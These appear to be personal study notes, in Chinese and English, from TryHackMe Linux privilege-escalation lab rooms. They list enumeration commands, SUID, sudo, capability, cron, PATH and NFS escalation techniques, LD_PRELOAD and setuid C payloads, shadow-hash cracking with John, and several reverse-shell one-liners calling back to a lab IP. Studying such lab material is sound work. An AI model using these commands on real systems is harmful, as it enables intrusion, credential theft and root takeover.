# Privilege Escalation
## Linux Privilege Escalation : 
	--> 權限較低的帳戶到權限較高的帳戶
	--> ssh karen@10.10.163.255 Password1
### Enumeration : 
		--> whoami 
			--> karen
		--> hostname : 傳回目標電腦的主機名稱
			--> wade7363 
			
		--> uname -a : 列印系統信息 
			--> Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 
				x86_64 x86_64 x86_64 GNU/Linux
				
		--> /proc/version : 提供有關目標系統進程的資訊
			--> Linux version 3.13.0-24-generic (buildd@panlong) 
				(gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014
				
		--> /etc/issue : 件來識別系統
			--> Ubuntu 14.04 LTS \n \l
			
		--> ps :  查看Linux系統上正在運行的進程的有效方法 | 顯示目前 shell 的進程
			--> PID：進程ID | TTY：使用者使用的終端類型 | TIME：進程使用的CPU時間量 | CMD：正在運行的命令或可執行檔
				 PID 	TTY         	 TIME 		CMD
				 1861	 pts/6  	  00:00:00	 sh
				 2213 	pts/6  		  00:00:00	 ps
			--> ps -A：查看所有正在運行的進程 (all)
			--> ps axjf：查看進程樹（請參閱下面的樹形成直到ps axjf運行
			--> ps aux : 顯示所有使用者的進程 (a) | 顯示啟動進程的使用者 (u) | 顯示未連接到終端的進程 (x)

		--> env : 環境變數
			--> HOME=/home/karen
			--> PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
			--> SHELL=/bin/sh
			
			--> PATH 變數可能具有編譯器或腳本語言（例如Python），可用於在目標系統上執行程式碼或用於權限升級
			
		--> sudo : 以 root 權限執行
			--> sudo -l : 列出您的使用者可以使用 運行的所有命令
			
		--> ls -la 
		
		--> id : 提供使用者權限等級和群組成員資格的總體概述。
			--> id 
				--> uid=1001(karen) gid=1001(karen) groups=1001(karen)
			--> if root
				
		--> /etc/passwd : 發現系統上使用者
			--> only name :
				--> cat /etc/passwd | cut -d ":" -f 1
				--> cat /etc/passwd | grep home
				
		--> history : 查看早期命令
		
		--> ifconfig : 將為我們提供有關係統網路介面的資訊
			--> eth0
			--> tun0 
			--> tun1
			
		--> ip route :查看存在哪些網路路由
		
		--> netstat :
			--> netstat -a	 : 顯示所有監聽連接埠和已建立的連線 
			--> netstat -at	 : 列出 TCP協定
			--> netstat -au  : 列出 UDP協定
			--> netstat -l   : 列出處於「監聽」模式的連接埠
			--> netstat -s   : 按協定列出網路使用統計資料
			--> netstat -tp  : 列出連線以及服務名稱和PID 資訊
			--> netstat -i   : 顯示介面統計資料
			--> netstat -ano : -a：顯示所有socket | -n: 不解析名稱 | -o：顯示定時器
			
			find -name flag.txt 
		--> find : 
			--> find . -name flag1.txt 	: 在目前目錄下找到名為「flag1.txt」的文件
			--> find /home -name flag1.txt	: 在/home目錄下找到檔案名稱“flag1.txt”
			--> find / -type d -name config : 找到「/」下名為config的目錄 
			--> find / -type f -perm 0777	: 尋找具有777權限的檔案
			--> find / -perm a=x		: 尋找可執行文件
			--> find /home -user frank	: 查找“/home”下用戶“frank”的所有文件
			--> find / -mtime 10		: 尋找最近 10天內修改過的文件
			--> find / -atime 10		: 尋找最近 10 天內造訪過的文件
			--> find / -cmin -60		: 尋找最近 一小時（60 分鐘）內更改的文件
			--> find / -amin -60		: 尋找最近 一小時（60分鐘）內的文件存取狀況
			--> find / -size 50M		: 查找50MB大小的文件

			--> type : -d (find 目錄 ) -f (file)
			--> perm : 權限
			--> name : 名為「xxx」的文件
			--> user
			--> size : （+）和（-）符號  --> 大於或小於 
				--> find / -size +100M
				
			--> 「find」指令往往會產生錯誤 : 
				--> find / -size +100M -type f 2>/dev/null
			
			--> 尋找全域可寫資料夾 : 
				--> find / -writable -type d 2>/dev/null	
				--> find / -perm -222 -type d 2>/dev/null	
				--> find / -perm -o w -type d 2>/dev/null
				
			--> 尋找全域可執行資料夾
				--> find / -perm -o x -type d 2>/dev/null
				
			--> 尋找開發工具和支援的語言：
				--> find / -name perl* | find / -name python* |find / -name gcc*
				
			--> 尋找特定檔案權限： e.g 尋找設定了 SUID 位元的檔案 --允許我們以比目前使用者更高的權限等級運行該文件
				--> find / -perm -u=s -type f 2>/dev/null
			
		--> General Linux Commands
			--> find, locate, grep, cut, sort
		
### Automated Enumeration Tools
		--> LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
		=> need upload to shell: 
		--> 1. option 
			--> curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
		--> 2. option
			--> scp 2024_5_CTF/OSCP/try_hack_me/task/linpeas.sh jan@10.10.50.135:/dev/shm
			--> chmod +x linpeas.sh
			--> ./linpeas.sh
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
		--> LinEnum: https://github.com/rebootuser/LinEnum
		--> LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
		--> Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
		--> Linux Priv Checker: https://github.com/linted/linuxprivchecker

		--> nc -lnvp 1234
		--> under shell : 
			--> wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh
			--> ./lse.sh help | bash lse.sh 
			
## Privilege Escalation:
### Kernel Exploits :
		--> 內核利用方法
			--> 識別核心版本 => uname -a
			--> 搜尋並找到目標系統核心版本的漏洞程式碼 =>cve => https://www.exploit-db.com/
			--> 運行漏洞利用程式  => RUN PAYLOAD
			
			--> use wget upload payload 
			--> SimpleHTTPServer :
				--> python3 -m http.server 80
			--> under target : 
				--> cd /tmp
				--> wget 10.11.92.230:80/37292.c
				--> gcc 37292.c -o 37292
				--> ./37292
### Sudo :
		--> sudo 指令允許您以 root 權限執行程式
		--> sudo -l : 使用該命令檢查其目前與root權限相關的情況
		--> https://gtfobins.github.io/
		
		--> Leverage application functions
			-->  Apache2 server
				--> -f : 支援載入備用設定檔 -- 備用 ServerConfigFile
			-> apache2 -f /etc/shadow
			
		--> Leverage LD_PRELOAD 環境
			--> 允許任何程式使用共享庫的函數
			--> “env_keep”
			
			--> 檢查 LD_PRELOAD（使用 env_keep 選項）
				=> sudo -l
					=> env_keep+=LD_PRELOAD
					
			--> 編寫一個簡單的 C 程式碼編譯為共享物件（.so 副檔名）文件
				=> create shell.c : 			
					#include <stdio.h>
					#include <sys/types.h>
					#include <stdlib.h>

					void _init() {
					unsetenv("LD_PRELOAD");
					setgid(0);
					setuid(0);
					system("/bin/bash");
					}	
				
				=> run : gcc -fPIC -shared -o shell.so shell.c -nostartfiles	
					--> output a shell.so file
						
			--> 使用 sudo 權限和指向我們的 .so 檔案的 LD_PRELOAD 選項來執行程式
				=> sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
		
		Task : 
			--> ssh karen@10.10.188.151 : Password1
			--> sudo less /etc/shadow
				=> 在 /etc/shadow 末尾寫入 !/bin/bash
				--> cat flag2.txt	
			--> 使用 Nmap 產生 root shell :
				--> https://gtfobins.github.io/ : search nmap -> sudo 
				-->  sudo nmap --interactive
			--> Hash password : cat /etc/shadow

			
### SUID : 
		--> ssh karen@10.10.65.78 | Password1
		--> SUID（設備使用者識別）和 SGID（設備群組識別）而改變
		--> 列出設定了 SUID 或 SGID 位元的檔案 :
			--> find / -type f -perm -04000 -ls 2>/dev/null
				--> 將錯誤訊息重定向到 /dev/null : 2>/dev/null 
		--> 將此清單中的可執行檔與 GTFOBins ( https://gtfobins.github.io ) 進行比較
		
		--> Nano 文字編輯器的 SUID 位元設定允許我們使用檔案擁有者的權限建立、編輯和讀取檔案
		
		--> 兩個基本的權限升級選項 : 
			--> 讀取檔案/etc/shadow
			--> 將我們的用戶新增至/etc/passwd.
		
		讀取檔案/etc/shadow : need root
		
		--> unshadow工具 : 建立一個可由John the Ripper破解的檔案
			--> unshadow passwd.txt shadow.txt > passwords.txt
			--> sudo john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt

		
		
		--> 新增具有 root 權限的新使用者
			--> 希望新用戶擁有的密碼的雜湊 : 
				=> Hash password : openssl passwd -1 -salt YHM [assword1
				=> Add to /etc/passwd
					=> hacker:0:0:root:/root:/bin/bash
				=>切換用戶 : su hacker
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			--> sudo -l 
				=> (All:ALL) 
				--> sudo su  
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
		--> Task : 
			--> ssh karen@10.10.52.218 Password1
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			--> cat /etc/passwd
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			--> go to /tmp 建立passwd和shadow檔案
				--> copy /etc/passwd and /etc/shadow
				
			--> find / -type f -perm -04000 -ls 2>/dev/null
				=> file  what command that have suid <-- we found base64
			
				--> then use : /usr/bin/base64 /etc/shadow | /usr/bin/base64 -d
				--> copy to file  to kali 
	
			--> kali : 
				--> unshadow passwd Shadow | tee hash
				--> 破解使用者的密碼 :
					--> sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash

			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			--> 尋找flag3.txt檔  : find . -name flags3.txt 2>/dev/null
			 --> /usr/bin/base64 flag3.txt | /usr/bin/base64 -d
			 
### Capabilities : 
		--> getcap 工具列出啟用的功能 : have to wait
			=> getcap -r / 2>/dev/null
				=>沒有設定 SUID 位元 :  /home/alper/vim = cap_setuid+ep
				
		--> 啟動一個 root shell	:
			--> GTFOBins : https://gtfobins.github.io/
			
			--> check python verion 
			--> ./vim -c ':python3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
			--> ./view -c ':python import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
				
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> Task : 
			--> ssh karen@10.10.77.33 | Password1	
				--> getcap -r / 2>/dev/null =?vim | view
				--> ./vim -c ':python3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
				--> bash -i 
					=>root@ip-10-10-77-33:~# 
				--> find / -name flag4.txt 2>/dev/null
			
### Cron Jobs : 
		--> 用於在特定時間執行腳本或二進位檔案
		--> /etc/crontab => to find a sh
		
		--> 啟動反向 shell : change the sh :  
			--> nano backup.sh 
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			1. revershell : 
				#!/bin/bash
				bash -i >& /dev/tcp/10.11.92.230/6666 0>&1
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
			--> chmod 777 backup.sh 
			--> sudo nc -nlvp 6666
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
			2. in-line
				#!/bin/bash 
				chmod u+s /bin/bash #u+s 用來授予 SUID 權限
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
			--> chmod 777 backup.sh 
			--> /bin/bash -p
			
		--> cron 作業 : 未定義腳本的完整路徑 
			=> cron 將引用 /etc/crontab 檔案中 PATH 變數下列出的路徑
			=> recover 被刪除antivirus.sh : locate antivirus.sh 
							
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
		--> Task : 
			--> ssh karen@10.10.168.255 | Password1
			--> cat /etc/crontab
			--> nano backup.sh 
				--> chmod 777 backup.sh 
				--> sudo nc -nlvp 6666
			--> find  Matt’s password
				--> grep matt /etc/shadow
				--> grep matt /etc/passwd
			--> unshadow passwd shadow | tee Password
				--> john --wordlist=/usr/share/wordlists/rockyou.txt Password		
### PATH
		--> PATH 是一個環境變量 : 告訴作業系統在哪裡搜尋可執行檔
		--> echo $PATH
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		path : 
			--> 為 /bin/bash 的副本授予了可執行權限 ( last=> ./path)
			--> create path_exp.c : 啟動一個名為“thm”的系統二進位文件
			--> 將其編譯為可執行檔並設定 SUID 位元  : call path
				--> gcc path_exp.c -o path -w 
				--> chmod u+s path 
	
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		thm : 
			--> find 容易寫入的資料夾
				--> find / -writable 2>/dev/null | cut -d "/" -f 2,3 | sort -u | grep user 
				--> grep -v proc  | grep user 
				
			--> all X寫入 => 加/tmp入 PATH : 
				--> export PATH=/tmp:$PATH
				
			--> 透過將 /bin/bash 作為“thm”複製到 /tmp 資料夾下
				--> cd /tmp	
				--> echo "/bin/bash" > thm
				--> chmod 777 thm
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		path_exp.c : 
			#include<unistd.h>
			void main()
			{ setgid(0);
			  setuid(0);
			  system("thm");
			}
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
		--> Task : 
			--> ssh karen@10.10.138.168 | Password1
			
				--> cd /tmp	
				--> echo "/bin/bash" > thm
				--> chmod 777 thm
				
				--> echo $PATH
				--> export PATH=/tmp:$PATH
				--> cd 
				
				--> find / -writable 2>/dev/null | cut -d "/" -f 2,3 | sort -u | grep user 
				--> cd writable diretory 
				
				--> ./test
				
				--> find / -name flag6.txt 2>/dev/null
				--> cat /home/matt/flag6.txt

### Network File Sharing (NFS)
		-->  /etc/exports
		--> “no_root_squash” :禁止以 root 權限操作任何檔案。
		-> we need 建立一個設定了 SUID 位元的可執行檔並在目標系統上執行“no_root_squash” 
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
		
		--> kali: 
			--> enumerating mountable share : 
				--> showmount -e  <Target Machine IP address>
			--> 把“no_root_squash”安裝到我們的攻擊機器
			
			--> mkdir /tmp/backupsonattackermachine
			--> sudo mount -o rw <IP>:<SHARED_FOLDER> /tmp/backupsonattackermachine

		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> nano nfs.c 
			int main()
			{ setgid(0);
			  setuid(0);
			  system("/bin/bash");
			  return 0;
			}
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> gcc static nfs.c -o nfs //編譯此程式碼
		--> chmod +s nfs //賦予suid權限
		--> ls -l nfs
		--> ./nfs
		
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
		--> Task : 
			--> ssh karen@10.10.240.82 | Password1
				--> cat /etc/exports

			--> sudo kali : 
				--> showmount -e 10.10.240.82
				--> mkdir /tmp/backdoor2
				--> mount -t nfs 10.10.240.82:/home/ubuntu/sharedfolder  /tmp/backdoor2
				
			--> option 1 : fail!
				--> kali :
					--> cd /tmp/backdoor2
					--> cp /bin/bash .
					--> chmod +s bash
				--> ssh : 
					--> cd /home/ubuntu/sharedfolder 
					--> ./bash -p //ROOT shell
					=> `GLIBC_2.33' not found (required by ./bash)


			--> option 2 : work ! 
				--> kali : 
					--> cd /tmp/backdoor
					--> nano nfs2.c 
					--> gcc -static nfs2.c -o nfs2
					--> chmod +s nfs2
				--> ssh
					--> cd /home/ubuntu/sharedfolder 
					--> ./nfs2

			--> root : 
				--> find / -name flag7.txt 2>/dev/null 
				--> cat ./home/matt/flag7.txt
		

## Capstone Challenge
		--> ssh leonard@10.10.176.55  | Penny123

### flag1 
			--> find / -type f -perm -04000 -ls 2>/dev/null 
			--> cat /etc/passwd
			--> /usr/bin/base64 /etc/shadow | /usr/bin/base64 -d 
			
			--> unshadow passwd Shadow | tee hash
			--> sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash
			 	=> Password1        (missy)   
			=> ssh missy@10.10.176.55 Password1
				--> find / -name flag1.txt 2>/dev/null
### flag2 
			=> root
			--> sudo -l 
			--> https://gtfobins.github.io
			--> sudo find . -exec /bin/sh \; -quit
			--> find / -name flag2.txt 2>/dev/null	
### SUID 
			--> GTFOBins => systemctl
				=> 將“id > /tmp/output”更改為“sh -p”或“chmod +s /bin/bash”
					TF=$(mktemp).service
					echo '[Service]
					Type=oneshot
					ExecStart=/bin/sh -c "chmod +s /bin/bash"
					[Install]
					WantedBy=multi-user.target' > $TF
					systemctl link $TF
					systemctl enable --now $TF
### PATH  :
			--> find / -perm -u=s -type f 2>/dev/null
				=> /usr/bin/menu
			--> 運行二進位文件
				--> /usr/bin/menu
			--> Strings : 用於在二進位檔案中尋找人類可讀的字串
				--> Strings /usr/bin/menu	
					=> found that curl use 	不完整路徑
						=> curl -I localhost
### 不指定完整路徑
			--> 系統將查看 PATH 變數並在路徑中指定的所有位置中搜尋所需檔案
			--> export PATH=/tmp:$PATH
			
			--> cd /tmp
			--> echo /bin/sh > curl
			--> chmod 777 curl
			--> export PATH=/tmp:$PATH
			--> /usr/bin/menu
## Common Linux Privesc
	--> ssh user3@10.10.41.95 | password
### common : 
		=> uname -a : 列印系統信息 
		=> cat file 
			=> /etc/crontab 執行腳本或二進位檔案
			=> /etc/passwd 發現系統上使用者
			=> /etc/shadow
			=> /etc/exports (NFS)
		=> GTFOBins
			=> sudo -l
			=> SUID 	
				=> find / -type f -perm -04000 -ls 2>/dev/null
				--> cap_setuid+ep
			=> Capabilities
				=> getcap -r / 2>/dev/null
		
		=> PATH
			=> find / -writable 2>/dev/null 
			=> export PATH=/tmp:$PATH
		=> NFS
			=> showmount -e
			=> sudo mount -o rw
		=> su 切換 user
			=> su user7

### LinEnum <--簡單的 bash 腳本
		--> https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
		=> /home/kali/2024_5_CTF/try_hack_me/task/JR/LinEnum.sh
		=> python3 -m http.server 8000
		=> wget 10.11.92.230:8000/2024_5_CTF/try_hack_me/task/JR/LinEnum.sh
		=> chmod +x LinEnum.sh
		=> ./LinEnum.sh
		
		--> uname | hostname | id |
		--> /etc/passwd | sudo | /home (ls -al) | env | Path 
		--> /etc/shells 
		--> Cron jobs: (/etc/cron | /etc/crontab)
		--> ifconfig
		--> Listening TCP/UDP
		--> PS
		--> /etc/init.d/
		--> version (Sudo / MySQL / apache /)
		--> INTERESTING FILES (nc | wget | nmap |gcc | curl)
		--> Can we read/write sensitive files
		--> SUID files
		--> capabilities
		--> NFS
		
	
###SUID : 
		--> 讀取 (4)、寫入 (2) 和執行 (1) => 7
		--> find / -perm -u=s -type f 2>/dev/null
		--> ./SUID file
### /etc/rasswd :
		--> x:0:0:root:/root:/bin/bash
		--> 使用者名稱:密碼(X):UID(0 root):GID(0 root):ID資訊:主目錄:shell
		
		=> openssl passwd -1 -salt new 123
			=> new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
### sudo -l 
		--> GTFOBins
			=> vi : sudo vi -c ':!/bin/sh' /dev/null
### crontab 
		--> # m h dom mon dow 使用者指令
		
		--> msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
			=> msfvenom -p cmd/unix/reverse_netcat lhost=10.11.92.230 lport=8888 R
			
		--> 
		--> mkfifo /tmp/vqqkpvj; nc 10.11.92.230 8888 0</tmp/vqqkpvj | /bin/sh >/tmp/vqqkpvj 2>&1; rm /tmp/vqqkpvj
### Path :
		--> #echo "[whatever command we want to run]" > [name of the executable we're imitating] # imitating--假冒
		--> cd /tmp
		--> echo "/bin/bash" >> ls
		--> chmod +x ls
		--> export PATH =/tmp:$PATH
		
		=> ./script
## Linux PrivEsc
	--> ssh user@10.10.118.228 |  password321
	--> https://tryhackme.com/r/room/linuxprivesc
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
	
	--> /etc/shadow 檔案包含使用者密碼雜湊值
		--> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
		--> su root + password
		--> 新的密碼雜湊 : 
	--> /etc/passwd 檔案包含有關使用者帳戶的資訊
		--> mkpasswd -m sha-512 newpasswordhere
		--> openssl passwd newpasswordhere
	--> GTFOBins ( https://gtfobins.github.io ) 
		--> sudo -l 
	
